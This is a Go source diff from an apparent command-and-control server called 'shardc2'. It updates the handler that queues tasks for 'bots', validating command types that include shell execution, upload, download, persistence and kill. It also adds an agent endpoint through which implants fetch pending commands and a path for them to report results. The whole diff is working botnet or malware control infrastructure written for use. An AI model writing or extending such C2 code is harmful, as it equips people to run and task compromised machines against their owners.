@@ -5,6 +5,7 @@ import (
 
 	"github.com/gofiber/fiber/v2"
 	"github.com/shardc2/shardc2/internal/database"
+	"github.com/shardc2/shardc2/pkg/models"
 )
 
 type CommandHandler struct {
@@ -24,8 +25,25 @@ func (h *CommandHandler) Create(c *fiber.Ctx) error {
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
 	}
+	if req.BotID == "" {
+		return c.Status(400).JSON(fiber.Map{"error": "bot_id required"})
+	}
+	if req.Payload == "" {
+		return c.Status(400).JSON(fiber.Map{"error": "payload required"})
+	}
+	if len(req.Payload) > 1048576 {
+		return c.Status(400).JSON(fiber.Map{"error": "payload too large (max 1MB)"})
+	}
 	if req.Type == "" {
-		req.Type = "shell"
+		req.Type = models.CmdTypeShell
+	}
+
+	validTypes := map[string]bool{
+		models.CmdTypeShell: true, models.CmdTypeUpload: true, models.CmdTypeDownload: true,
+		models.CmdTypeSleep: true, models.CmdTypePersist: true, models.CmdTypeKill: true,
+	}
+	if !validTypes[req.Type] {
+		return c.Status(400).JSON(fiber.Map{"error": "invalid command type"})
 	}
 
 	var cmdID string
@@ -34,7 +52,6 @@ func (h *CommandHandler) Create(c *fiber.Ctx) error {
 		VALUES ($1, $2, $3) RETURNING id`,
 		req.BotID, req.Type, req.Payload,
 	).Scan(&cmdID)
-
 	if err != nil {
 		return c.Status(500).JSON(fiber.Map{"error": "failed to create command"})
 	}
@@ -42,8 +59,17 @@ func (h *CommandHandler) Create(c *fiber.Ctx) error {
 	return c.Status(201).JSON(fiber.Map{"id": cmdID, "status": "pending"})
 }
 
+func (h *CommandHandler) AgentGetPending(c *fiber.Ctx) error {
+	botID, _ := c.Locals("bot_id").(string)
+	return h.getPending(c, botID)
+}
+
 func (h *CommandHandler) GetPending(c *fiber.Ctx) error {
 	botID := c.Params("bot_id")
+	return h.getPending(c, botID)
+}
+
+func (h *CommandHandler) getPending(c *fiber.Ctx, botID string) error {
 	rows, err := h.db.Query(`
 		SELECT id, type, payload FROM commands
 		WHERE bot_id = $1 AND status = 'pending'
@@ -64,6 +90,12 @@ func (h *CommandHandler) GetPending(c *fiber.Ctx) error {
 	if cmds == nil {
 		cmds = []fiber.Map{}
 	}
+
+	// Mark fetched commands as executing
+	for _, cmd := range cmds {
+		h.db.Exec(`UPDATE commands SET status = 'executing' WHERE id = $1`, cmd["id"])
+	}
+
 	return c.JSON(fiber.Map{"commands": cmds})
 }
 
@@ -76,8 +108,18 @@ func (h *CommandHandler) SubmitResult(c *fiber.Ctx) error {
 	if err := c.BodyParser(&req); err != nil {
 		return c.Status(400).JSON(fiber.Map{"error": "invalid request body"})
 	}
+	if req.CommandID == "" {
+		return c.Status(400).JSON(fiber.Map{"error": "command_id required"})
+	}
 	if req.Status == "" {
-		req.Status = "completed"
+		req.Status = models.StatusCompleted
+	}
+
+	validStatuses := map[string]bool{
+		models.StatusCompleted: true, models.StatusFailed: true,
+	}
+	if !validStatuses[req.Status] {
+		return c.Status(400).JSON(fiber.Map{"error": "invalid status"})
 	}
 
 	now := time.Now()
